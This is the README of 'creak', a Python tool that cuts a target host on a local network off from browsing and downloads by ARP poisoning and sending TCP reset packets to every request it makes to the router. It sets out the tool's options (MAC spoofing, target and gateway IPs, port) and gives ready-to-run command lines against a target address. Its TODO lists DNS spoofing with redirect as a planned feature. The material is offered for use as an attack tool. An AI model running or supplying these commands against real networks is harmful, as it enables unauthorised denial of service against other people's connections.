# creak

Deny navigation and download capabilities of a target host in the local network
performing an ARP poison attack and sending reset TCP packets to every request
made to the router

## Options

```
Usage: creak.py [options] dev

Options:
  -h, --help           show this help message and exit
  -0, --spoof          Spoof mode, generate a fake MAC address to be used
                       during attack
  -m MACADDR           Mac address
  -s SOURCE            Source ip address (e.g. a class C address like
                       192.168.1.150) usually the router address
  -t TARGET            Target ip address (e.g. a class C address like
                       192.168.1.150)
  -p PORT              Target port to shutdown
  -v, --verbose        Verbose output mode
  -d, --dotted         Dotted output mode
```
## Example

Most basic usage:
Deny all traffic to the target host

``` python creak.py -t 192.168.1.30 wlan0 ```

Set a different gateway:

``` python creak.py -s 192.168.1.2 -t 192.168.1.30 wlan0 ```

Set a different mac address for the device:

``` python creak.py -m 00:11:22:33:44:55 -t 192.168.1.30 wlan0 ```

Spoof mac address generating a fake one:

``` python creak.py -0 -t 192.168.1.30 wlan0 ```

## TODO

- Multiple hosts denying
- DNS spoofing with redirect
- Scan mode
